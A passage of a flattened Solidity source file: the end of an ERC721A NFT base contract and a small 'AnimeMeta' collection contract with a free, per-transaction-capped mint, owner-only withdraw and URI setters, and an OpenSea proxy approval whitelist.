993         return _tokenApprovals[tokenId];
994     }
995 
996     /**
997      * @dev See {IERC721-setApprovalForAll}.
998      */
999     function setApprovalForAll(address operator, bool approved) public override {
1000         if (operator == _msgSender()) revert ApproveToCaller();
1001 
1002         _operatorApprovals[_msgSender()][operator] = approved;
1003         emit ApprovalForAll(_msgSender(), operator, approved);
1004     }
1005 
1006     /**
1007      * @dev See {IERC721-isApprovedForAll}.
1008      */
1009     function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {
1010         return _operatorApprovals[owner][operator];
1011     }
1012 
1013     /**
1014      * @dev See {IERC721-transferFrom}.
1015      */
1016     function transferFrom(
1017         address from,
1018         address to,
1019         uint256 tokenId
1020     ) public virtual override {
1021         _transfer(from, to, tokenId);
1022     }
1023 
1024     /**
1025      * @dev See {IERC721-safeTransferFrom}.
1026      */
1027     function safeTransferFrom(
1028         address from,
1029         address to,
1030         uint256 tokenId
1031     ) public virtual override {
1032         safeTransferFrom(from, to, tokenId, '');
1033     }
1034 
1035     /**
1036      * @dev See {IERC721-safeTransferFrom}.
1037      */
1038     function safeTransferFrom(
1039         address from,
1040         address to,
1041         uint256 tokenId,
1042         bytes memory _data
1043     ) public virtual override {
1044         _transfer(from, to, tokenId);
1045         if (to.isContract() && !_checkContractOnERC721Received(from, to, tokenId, _data)) {
1046             revert TransferToNonERC721ReceiverImplementer();
1047         }
1048     }
1049 
1050     /**
1051      * @dev Returns whether `tokenId` exists.
1052      *
1053      * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.
1054      *
1055      * Tokens start existing when they are minted (`_mint`),
1056      */
1057     function _exists(uint256 tokenId) internal view returns (bool) {
1058         return _startTokenId() <= tokenId && tokenId < _currentIndex &&
1059             !_ownerships[tokenId].burned;
1060     }
1061 
1062     function _safeMint(address to, uint256 quantity) internal {
1063         _safeMint(to, quantity, '');
1064     }
1065 
1066     /**
1067      * @dev Safely mints `quantity` tokens and transfers them to `to`.
1068      *
1069      * Requirements:
1070      *
1071      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called for each safe transfer.
1072      * - `quantity` must be greater than 0.
1073      *
1074      * Emits a {Transfer} event.
1075      */
1076     function _safeMint(
1077         address to,
1078         uint256 quantity,
1079         bytes memory _data
1080     ) internal {
1081         _mint(to, quantity, _data, true);
1082     }
1083 
1084     /**
1085      * @dev Mints `quantity` tokens and transfers them to `to`.
1086      *
1087      * Requirements:
1088      *
1089      * - `to` cannot be the zero address.
1090      * - `quantity` must be greater than 0.
1091      *
1092      * Emits a {Transfer} event.
1093      */
1094     function _mint(
1095         address to,
1096         uint256 quantity,
1097         bytes memory _data,
1098         bool safe
1099     ) internal {
1100         uint256 startTokenId = _currentIndex;
1101         if (to == address(0)) revert MintToZeroAddress();
1102         if (quantity == 0) revert MintZeroQuantity();
1103 
1104         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1105 
1106         // Overflows are incredibly unrealistic.
1107         // balance or numberMinted overflow if current value of either + quantity > 1.8e19 (2**64) - 1
1108         // updatedIndex overflows if _currentIndex + quantity > 1.2e77 (2**256) - 1
1109         unchecked {
1110             _addressData[to].balance += uint64(quantity);
1111             _addressData[to].numberMinted += uint64(quantity);
1112 
1113             _ownerships[startTokenId].addr = to;
1114             _ownerships[startTokenId].startTimestamp = uint64(block.timestamp);
1115 
1116             uint256 updatedIndex = startTokenId;
1117             uint256 end = updatedIndex + quantity;
1118 
1119             if (safe && to.isContract()) {
1120                 do {
1121                     emit Transfer(address(0), to, updatedIndex);
1122                     if (!_checkContractOnERC721Received(address(0), to, updatedIndex++, _data)) {
1123                         revert TransferToNonERC721ReceiverImplementer();
1124                     }
1125                 } while (updatedIndex != end);
1126                 // Reentrancy protection
1127                 if (_currentIndex != startTokenId) revert();
1128             } else {
1129                 do {
1130                     emit Transfer(address(0), to, updatedIndex++);
1131                 } while (updatedIndex != end);
1132             }
1133             _currentIndex = updatedIndex;
1134         }
1135         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1136     }
1137 
1138     /**
1139      * @dev Transfers `tokenId` from `from` to `to`.
1140      *
1141      * Requirements:
1142      *
1143      * - `to` cannot be the zero address.
1144      * - `tokenId` token must be owned by `from`.
1145      *
1146      * Emits a {Transfer} event.
1147      */
1148     function _transfer(
1149         address from,
1150         address to,
1151         uint256 tokenId
1152     ) private {
1153         TokenOwnership memory prevOwnership = ownershipOf(tokenId);
1154 
1155         bool isApprovedOrOwner = (_msgSender() == prevOwnership.addr ||
1156             isApprovedForAll(prevOwnership.addr, _msgSender()) ||
1157             getApproved(tokenId) == _msgSender());
1158 
1159         if (!isApprovedOrOwner) revert TransferCallerNotOwnerNorApproved();
1160         if (prevOwnership.addr != from) revert TransferFromIncorrectOwner();
1161         if (to == address(0)) revert TransferToZeroAddress();
1162 
1163         _beforeTokenTransfers(from, to, tokenId, 1);
1164 
1165         // Clear approvals from the previous owner
1166         _approve(address(0), tokenId, prevOwnership.addr);
1167 
1168         // Underflow of the sender's balance is impossible because we check for
1169         // ownership above and the recipient's balance can't realistically overflow.
1170         // Counter overflow is incredibly unrealistic as tokenId would have to be 2**256.
1171         unchecked {
1172             _addressData[from].balance -= 1;
1173             _addressData[to].balance += 1;
1174 
1175             _ownerships[tokenId].addr = to;
1176             _ownerships[tokenId].startTimestamp = uint64(block.timestamp);
1177 
1178             // If the ownership slot of tokenId+1 is not explicitly set, that means the transfer initiator owns it.
1179             // Set the slot of tokenId+1 explicitly in storage to maintain correctness for ownerOf(tokenId+1) calls.
1180             uint256 nextTokenId = tokenId + 1;
1181             if (_ownerships[nextTokenId].addr == address(0)) {
1182                 // This will suffice for checking _exists(nextTokenId),
1183                 // as a burned slot cannot contain the zero address.
1184                 if (nextTokenId < _currentIndex) {
1185                     _ownerships[nextTokenId].addr = prevOwnership.addr;
1186                     _ownerships[nextTokenId].startTimestamp = prevOwnership.startTimestamp;
1187                 }
1188             }
1189         }
1190 
1191         emit Transfer(from, to, tokenId);
1192         _afterTokenTransfers(from, to, tokenId, 1);
1193     }
1194 
1195     /**
1196      * @dev Destroys `tokenId`.
1197      * The approval is cleared when the token is burned.
1198      *
1199      * Requirements:
1200      *
1201      * - `tokenId` must exist.
1202      *
1203      * Emits a {Transfer} event.
1204      */
1205     function _burn(uint256 tokenId) internal virtual {
1206         TokenOwnership memory prevOwnership = ownershipOf(tokenId);
1207 
1208         _beforeTokenTransfers(prevOwnership.addr, address(0), tokenId, 1);
1209 
1210         // Clear approvals from the previous owner
1211         _approve(address(0), tokenId, prevOwnership.addr);
1212 
1213         // Underflow of the sender's balance is impossible because we check for
1214         // ownership above and the recipient's balance can't realistically overflow.
1215         // Counter overflow is incredibly unrealistic as tokenId would have to be 2**256.
1216         unchecked {
1217             _addressData[prevOwnership.addr].balance -= 1;
1218             _addressData[prevOwnership.addr].numberBurned += 1;
1219 
1220             // Keep track of who burned the token, and the timestamp of burning.
1221             _ownerships[tokenId].addr = prevOwnership.addr;
1222             _ownerships[tokenId].startTimestamp = uint64(block.timestamp);
1223             _ownerships[tokenId].burned = true;
1224 
1225             // If the ownership slot of tokenId+1 is not explicitly set, that means the burn initiator owns it.
1226             // Set the slot of tokenId+1 explicitly in storage to maintain correctness for ownerOf(tokenId+1) calls.
1227             uint256 nextTokenId = tokenId + 1;
1228             if (_ownerships[nextTokenId].addr == address(0)) {
1229                 // This will suffice for checking _exists(nextTokenId),
1230                 // as a burned slot cannot contain the zero address.
1231                 if (nextTokenId < _currentIndex) {
1232                     _ownerships[nextTokenId].addr = prevOwnership.addr;
1233                     _ownerships[nextTokenId].startTimestamp = prevOwnership.startTimestamp;
1234                 }
1235             }
1236         }
1237 
1238         emit Transfer(prevOwnership.addr, address(0), tokenId);
1239         _afterTokenTransfers(prevOwnership.addr, address(0), tokenId, 1);
1240 
1241         // Overflow not possible, as _burnCounter cannot be exceed _currentIndex times.
1242         unchecked {
1243             _burnCounter++;
1244         }
1245     }
1246 
1247     /**
1248      * @dev Approve `to` to operate on `tokenId`
1249      *
1250      * Emits a {Approval} event.
1251      */
1252     function _approve(
1253         address to,
1254         uint256 tokenId,
1255         address owner
1256     ) private {
1257         _tokenApprovals[tokenId] = to;
1258         emit Approval(owner, to, tokenId);
1259     }
1260 
1261     /**
1262      * @dev Internal function to invoke {IERC721Receiver-onERC721Received} on a target contract.
1263      *
1264      * @param from address representing the previous owner of the given token ID
1265      * @param to target address that will receive the tokens
1266      * @param tokenId uint256 ID of the token to be transferred
1267      * @param _data bytes optional data to send along with the call
1268      * @return bool whether the call correctly returned the expected magic value
1269      */
1270     function _checkContractOnERC721Received(
1271         address from,
1272         address to,
1273         uint256 tokenId,
1274         bytes memory _data
1275     ) private returns (bool) {
1276         try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, _data) returns (bytes4 retval) {
1277             return retval == IERC721Receiver(to).onERC721Received.selector;
1278         } catch (bytes memory reason) {
1279             if (reason.length == 0) {
1280                 revert TransferToNonERC721ReceiverImplementer();
1281             } else {
1282                 assembly {
1283                     revert(add(32, reason), mload(reason))
1284                 }
1285             }
1286         }
1287     }
1288 
1289     /**
1290      * @dev Hook that is called before a set of serially-ordered token ids are about to be transferred. This includes minting.
1291      * And also called before burning one token.
1292      *
1293      * startTokenId - the first token id to be transferred
1294      * quantity - the amount to be transferred
1295      *
1296      * Calling conditions:
1297      *
1298      * - When `from` and `to` are both non-zero, `from`'s `tokenId` will be
1299      * transferred to `to`.
1300      * - When `from` is zero, `tokenId` will be minted for `to`.
1301      * - When `to` is zero, `tokenId` will be burned by `from`.
1302      * - `from` and `to` are never both zero.
1303      */
1304     function _beforeTokenTransfers(
1305         address from,
1306         address to,
1307         uint256 startTokenId,
1308         uint256 quantity
1309     ) internal virtual {}
1310 
1311     /**
1312      * @dev Hook that is called after a set of serially-ordered token ids have been transferred. This includes
1313      * minting.
1314      * And also called after one token has been burned.
1315      *
1316      * startTokenId - the first token id to be transferred
1317      * quantity - the amount to be transferred
1318      *
1319      * Calling conditions:
1320      *
1321      * - When `from` and `to` are both non-zero, `from`'s `tokenId` has been
1322      * transferred to `to`.
1323      * - When `from` is zero, `tokenId` has been minted for `to`.
1324      * - When `to` is zero, `tokenId` has been burned by `from`.
1325      * - `from` and `to` are never both zero.
1326      */
1327     function _afterTokenTransfers(
1328         address from,
1329         address to,
1330         uint256 startTokenId,
1331         uint256 quantity
1332     ) internal virtual {}
1333 }
1334 
1335 
1336 // File contracts/AnimeMeta.sol
1337 
1338 /**
1339 ⣿⣿⣿⣿⣿⣿⣿⡇⡌⡰⢃⡿⡡⠟⣠⢹⡏⣦⢸⣿⣿⣿⣿⣿⣿
1340 ⣿⣿⣿⣿⣿⣿⡿⢰⠋⡿⢋⣐⡈⣽⠟⢀⢻⢸⡂⣿⣿⣿⣿⣿⣿
1341 ⣿⣿⣿⣿⣿⣋⠴⢋⡘⢰⣄⣀⣅⣡⠌⠛⠆⣿⡄⣿⣿⣿⣿⣿⣿
1342 ⣿⣿⣿⣿⣿⣿⣶⣁⣐⠄⠹⣟⠯⢿⣷⠾⠁⠥⠃⣹⣿⣿⣿⣿⣿
1343 ⣿⣿⣿⣿⠟⠋⡍⢴⣶⣶⣶⣤⣭⡐⢶⣾⣿⣶⡆⢨⠛⠻⣿⣿⣿
1344 ⣿⣿⣿⢏⣘⣚⣣⣾⣿⣿⣿⣿⣿⣿⢈⣿⣿⣿⣧⣘⠶⢂⠹⣿⣿
1345 ⣿⣿⠃⣾⣿⣿⣿⣿⣿⣿⡿⠿⠿⠿⡀⢿⣿⣿⣿⣿⣿⣿⡇⣿⣿
1346 ⣿⣿⡄⣿⣿⣿⣿⣿⣿⡯⠄⠄⠾⠿⠿⢦⣝⠻⣿⣿⣿⣿⠇⣿⣿
1347 ⣿⣿⣷⣜⠿⢿⣿⡿⠟⣴⣾⣿⡇⢰⣾⣦⡹⣷⣮⡙⢟⣩⣾⣿⣿
1348 ⣿⣿⣿⣿⣿⣆⢶⣶⣦⢻⣿⣿⣷⢸⣿⣿⣷⣌⠻⡷⣺⣿⣿⣿⣿
1349 ⣿⣿⣿⣿⣿⣿⡜⢿⣿⡎⢿⣿⣿⡬⣿⣿⣿⡏⢦⣔⠻⣿⣿⣿⣿
1350 ⣿⣿⣿⣿⣿⣿⣿⠎⠻⣷⡈⢿⣿⡇⢛⣻⣿⣿⢸⣿⣷⠌⡛⢿⣿
1351 ⣿⣿⣿⣿⣿⣿⡏⢰⣷⡙⢷⣌⢻⣿⣿⣿⣿⣿⢸⡿⢡⣾⣿⡶⠻
1352 ⣿⣿⣿⣿⣿⡟⣰⣶⣭⣙⠊⣿⣷⣬⣛⠻⣿⣿⠈⣴⣿⣿⣿⠃⠄
1353 ⣿⣿⣿⣿⡟⠄⠹⢿⣿⣿⣿⣤⠻⠟⠋⠡⠘⠋⢸⣿⣿⡿⠁⠄⠄
1354 ⣿⣿⣿⣿⠁⠄⠄⠄⠙⢻⣿⣿⣇⠄⠄⠄⠄⠄⣺⡿⠛⠄⠄⠄⠄
1355 ⣿⣿⣿⡏⠄⠄⠄⠄⠄⠄⠄⠉⠻⠷⠄⢠⣄⠄⠋⠄⠄⠄⠄⠄⠄
1356 ⣿⣿⣿⣿⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠸⣿⠄⠄⠄⠄⠄⠄⠄⠄
1357 **/
1358 
1359 
1360 contract AnimeMeta is ERC721A, Owneable {
1361 
1362     string public baseURI = "ipfs://QmbZtowBepS6r6T47uMkJVd6k32Dcka7Lcfv9m63U2RbCh/";
1363     string public contractURI = "ipfs://QmbhqamzGsTUa4puCDy743j1QnWPK7nFnESeXzMaPjjefR";
1364     string public constant baseExtension = ".json";
1365     address public constant proxyRegistryAddress = 0xa5409ec958C83C3f309868babACA7c86DCB077c1;
1366 
1367     uint256 public constant MAX_PER_TX_FREE = 0;
1368     uint256 public constant FREE_MAX_SUPPLY = 0;
1369     uint256 public constant MAX_PER_TX = 2;
1370     uint256 public constant MAX_SUPPLY = 500;
1371     uint256 public constant price = 0 ether;
1372 
1373     bool public paused = true;
1374 
1375     constructor() ERC721A("AnimeMeta", "AM") {}
1376 
1377     function mint(uint256 _amount) external payable {
1378         address _caller = _msgSender();
1379         require(!paused, "Paused");
1380         require(MAX_SUPPLY >= totalSupply() + _amount, "Exceeds max supply");
1381         require(_amount > 0, "No 0 mints");
1382         require(tx.origin == _caller, "No contracts");
1383         require(MAX_PER_TX >= _amount , "Excess max per paid tx");
1384         
1385         _safeMint(_caller, _amount);
1386     }
1387 
1388     function isApprovedForAll(address owner, address operator)
1389         override
1390         public
1391         view
1392         returns (bool)
1393     {
1394         // Whitelist OpenSea proxy contract for easy trading.
1395         ProxyRegistry proxyRegistry = ProxyRegistry(proxyRegistryAddress);
1396         if (address(proxyRegistry.proxies(owner)) == operator) {
1397             return true;
1398         }
1399 
1400         return super.isApprovedForAll(owner, operator);
1401     }
1402 
1403     function withdraw() external onlyOwner {
1404         uint256 balance = address(this).balance;
1405         (bool success, ) = _msgSender().call{value: balance}("");
1406         require(success, "Failed to send");
1407     }
1408 
1409     function setupOS() external onlyOwner {
1410         _safeMint(_msgSender(), 1);
1411     }
1412 
1413     function pause(bool _state) external onlyOwner {
1414         paused = _state;
1415     }
1416 
1417     function setBaseURI(string memory baseURI_) external onlyOwner {
1418         baseURI = baseURI_;
1419     }
1420 
1421     function setContractURI(string memory _contractURI) external onlyOwner {
1422         contractURI = _contractURI;
1423     }
1424 
1425     function tokenURI(uint256 _tokenId) public view override returns (string memory) {
1426         require(_exists(_tokenId), "Token does not exist.");
1427         return bytes(baseURI).length > 0 ? string(
1428             abi.encodePacked(
1429               baseURI,
1430               Strings.toString(_tokenId),
1431               baseExtension
1432             )
1433         ) : "";
1434     }
1435 }
1436 
1437 contract OwnableDelegateProxy { }
1438 contract ProxyRegistry {
1439     mapping(address => OwnableDelegateProxy) public proxies;
1440 }